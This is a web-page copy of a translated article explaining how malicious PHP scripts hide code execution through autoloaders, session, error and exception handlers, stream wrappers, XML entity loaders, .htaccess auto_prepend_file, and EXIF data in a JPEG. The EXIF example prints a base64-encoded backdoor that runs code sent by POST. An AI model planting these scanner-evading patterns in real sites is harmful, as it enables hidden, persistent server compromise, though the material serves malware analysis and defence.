<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Advanced methods of implicitly calling php code used in malicious scripts</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The logical continuation of the note about implicit calls of php code in malicious scripts will be its second part, in which I will consider more comp...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Advanced methods of implicitly calling php code used in malicious scripts</h1><div class="post__text post__text-html js-mediator-article">  The logical continuation of the <a href="http://habrahabr.ru/post/215139/">note about implicit calls of php code in malicious scripts</a> will be its second part, in which I will consider more complex and less obvious options for using various handlers and php loaders, and at the end of the article I will give a few examples of how hackers still implicitly cause malicious code and php scripts on the site. <br><br>  As an example of malicious code, we will use the call again. <br><br><pre><code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'Test'</span></span></code> </pre> 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Since the goal of the article is to show various approaches and mechanisms for hidden code execution, for simplicity, the function that executes our ‚Äúmalicious code‚Äù will be declared next to the code it implicitly calls.  In real life, the malicious code and its call are far from each other, at least in different php scripts, but more often the code is loaded from the database, image meta data, from another server, and then executed by the eval, assert, preg_replace functions and the like . <br><br><a name="habracut"></a><br><br>  <b>Option # 1: use the autoload mechanism.</b> <br><br>  Malicious code is invoked in an autoload handler when creating a nonexistent class. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__autoload</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($classname)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'Test'</span></span>; } <span class="hljs-comment"><span class="hljs-comment">//... new myEvilClass();</span></span></code> </pre><br><br>  <b>Option # 2: use another autoload mechanism in version 5.3 and higher</b> <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">// php &gt;= 5.3.0 class EvilClass { static public function evil($name) { echo 'Test'; } } // ... spl_autoload_register(__NAMESPACE__ .'\EvilClass::evil'); // ... new Malware;</span></span></code> </pre><br><br>  <b>Option number 3: use the session handler.</b> <br><br>  At the time of the session creation, the registered function will be called. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">just_do_it</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'Test'</span></span>; } <span class="hljs-comment"><span class="hljs-comment">// ... $f = function() {}; session_set_save_handler("just_do_it", $f, $f, $f, $f, $f); @session_start();</span></span></code> </pre><br><br>  <b>Option number 4: use an iterator.</b> <br><br>  For a change, we will not explicitly declare a function.  In the variant below, the function code can be taken from any storage in <br>  as a string and create a function in runtime. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $f = create_function(<span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">"echo 'Test';"</span></span>); <span class="hljs-comment"><span class="hljs-comment">// ... $it = new ArrayIterator(array('')); iterator_apply($it, $f, array($it));</span></span></code> </pre><br><br>  <b>Option number 5: call through an exception handler.</b> <br><br>  In this version, the code for the call can be passed as an exception text. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exception_handler</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($e)</span></span></span><span class="hljs-function"> </span></span>{ preg_replace_callback(<span class="hljs-string"><span class="hljs-string">'||'</span></span>, create_function(<span class="hljs-string"><span class="hljs-string">''</span></span>, $e-&gt;getMessage()), <span class="hljs-string"><span class="hljs-string">''</span></span>); } <span class="hljs-comment"><span class="hljs-comment">// ... set_exception_handler('exception_handler'); // ... throw new Exception('echo "Test";');</span></span></code> </pre><br><br>  <b>Option number 6: use error handler.</b> <br><br>  The approach is similar to # 5, but the code is implicitly called by the trigger_error () or user_error () methods.  The code itself is transmitted through the error text.  It is worth noting that this solution works with any error_reporting settings. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">error_handler</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($errno, $errstr, $errfile, $errline)</span></span></span><span class="hljs-function"> </span></span>{ array_map(create_function(<span class="hljs-string"><span class="hljs-string">''</span></span>, $errstr), <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>(<span class="hljs-string"><span class="hljs-string">''</span></span>)); } <span class="hljs-comment"><span class="hljs-comment">// ... set_error_handler('error_handler'); $badcode = 'echo "Test";'; trigger_error($badcode, E_USER_ERROR); //  user_error();</span></span></code> </pre><br><br>  <b>Option number 7: use your own entity loader.</b> <br><br>  Works since version 5.4.  Malicious code can be in XML tags or in service fields of a document. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">//  php &gt;= 5.4 $xml =&lt;&lt;&lt;XML &lt;!DOCTYPE zlodei PUBLIC "echo 'Test';" "http://example/"&gt; &lt;zlodei&gt;bar&lt;/zlodei&gt; XML; $dtd =&lt;&lt;&lt;DTD &lt;!ELEMENT zlodei (#PCDATA)&gt; DTD; libxml_set_external_entity_loader( function ($public, $system, $context) use($dtd) { array_reduce(array(''), create_function('', $public)); } ); // ... $dd = new DOMDocument; $r = $dd-&gt;loadXML($xml); @$dd-&gt;validate();</span></span></code> </pre><br><br>  <b>Option number 8: create your own stream for an implicit code call</b> <br><br>  A stream handler is registered and any functions supporting work with streams can execute code that can be passed to the url or written to the stream.  For a change, instead of the banal eval (), the code is called via create_function (). <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MalwareStream</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">stream_open</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($path, $mode, $options, &amp;$opened_path)</span></span></span><span class="hljs-function"> </span></span>{ $url = parse_url($path); $f = create_function(<span class="hljs-string"><span class="hljs-string">''</span></span>, $url[<span class="hljs-string"><span class="hljs-string">"host"</span></span>]); $f(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } } <span class="hljs-comment"><span class="hljs-comment">// ... stream_wrapper_register("malw", "MalwareStream"); // ... $fp = fopen('malw://echo "Test";', '');</span></span></code> </pre><br><br>  Unlike the constructions listed in the <a href="http://habrahabr.ru/post/215139/">previous note</a> , it is quite problematic to detect such implicit code calls in static analysis.  Server antivirus scanners cannot do this yet. <br><br><h5>  Bonus track </h5><br>  What other options do hackers use to download and execute malicious code? <br><br>  First, the use of php_auto_append / php_auto_prepend directives in the .htaccess file or php.ini.  For example, <br><br><pre> <code class="apache hljs"><span class="hljs-attribute"><span class="hljs-attribute">php_value</span></span> auto_prepend_file /images/stories/mycode.jpg</code> </pre><br><br>  will execute code from mycode.jpg file before executing any script. <br><br>  Secondly, dynamic loading of extensions by the dl () function.  For this, a .so (* nix) or .dll (windows) module must be compiled.  This is quite a rare case, however, and it has a place to be.  Advanced hackers can develop and inject modules into Apache or nginx. <br><br>  Thirdly, there is a construction with back quotes (which is an alias for shell_exec): <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $a = `ls -la`; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $a;</code> </pre><br><br>  It will also execute the system command ls -la, if, of course, shell_exec is enabled in php settings. <br><br>  And finally, an example of an implicit code call that is loaded from the exif header of a jpeg file. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $exif = exif_read_data(<span class="hljs-string"><span class="hljs-string">'/home/website/images/stories/food/evil.jpg'</span></span>); preg_replace($exif[<span class="hljs-string"><span class="hljs-string">'Make'</span></span>],$exif[<span class="hljs-string"><span class="hljs-string">'Model'</span></span>],<span class="hljs-string"><span class="hljs-string">''</span></span>);</code> </pre><br><br>  A jpg file looks like this: <br><br> <code>yOya^@^PJFIF^@^A^B^@^@d^@d^@^@ya^@?Exif^@^@II*^@ <br> ^H^@^@^@^B^@^O^A^B^@^F^@^@^@&amp;^@^@^@^P^A^B^@m^@^@^@,^@^@^@^@^@^@^@/.*/e^ <br> @ eval ( base64_decode("aWYgKGl zc2V0KCRfUE9TVFsie noxIl0pKSB7ZXZhbChzd <br> HJpcHNsYXNoZXMoJF9QT1NUWyJ6ejEiXSkpO30=')); <br> @yi^@^QDucky^@^A^@^D^@^@^@&lt;^@^@yi^@^NAdobe^...</code> <br> <br>  /.*/E is taken from the Make field, @ eval (base64_decode (...)) from the Model field and is executed via preg_replace () due to the ‚Äúe‚Äù modifier. <br><br>  Thank you for attention. </div><p>Source: <a href="https://habr.com/ru/post/215817/">https://habr.com/ru/post/215817/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../215805/index.html">The sixth issue of TsODY.RF magazine</a></li>
<li><a href="../215807/index.html">Œª-calculus. Part One: History and Theory</a></li>
<li><a href="../215809/index.html">Facebook vs. Google: the battle of technology giants has moved to the sky</a></li>
<li><a href="../215811/index.html">Apply visual effects to images in Django</a></li>
<li><a href="../215815/index.html">Piracy is the engine of progress. Scientific research in the field of uncontrolled copying</a></li>
<li><a href="../215819/index.html">Content Marketing: 9 Openness Lessons</a></li>
<li><a href="../215823/index.html">How to keep finances in the stock market: Risk management</a></li>
<li><a href="../215825/index.html">Helicopter hangar, controlled from the aircraft</a></li>
<li><a href="../215827/index.html">Changes in copyright</a></li>
<li><a href="../215829/index.html">How I took a little Instagram</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>